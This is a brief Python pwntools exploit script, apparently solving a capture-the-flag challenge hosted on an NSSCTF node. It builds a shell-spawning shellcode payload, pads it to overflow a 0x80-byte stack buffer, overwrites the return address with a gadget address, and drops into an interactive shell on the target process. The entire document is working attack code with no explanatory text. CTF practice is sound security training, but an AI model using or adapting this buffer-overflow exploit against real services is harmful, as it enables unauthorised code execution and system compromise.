from pwn import *

context(os="linux", arch="amd64", log_level="info")

#io = remote("node4.anna.nssctf.cn", 22782)
io = process("./service")

rsi_push = 0x4a6266
payload = asm(shellcraft.sh()) # pyright: ignore[reportAttributeAccessIssue]
payload = payload.ljust(0x80, b"\x00") + b"a" * 8 + p64(rsi_push)

io.sendline(payload)

io.interactive()
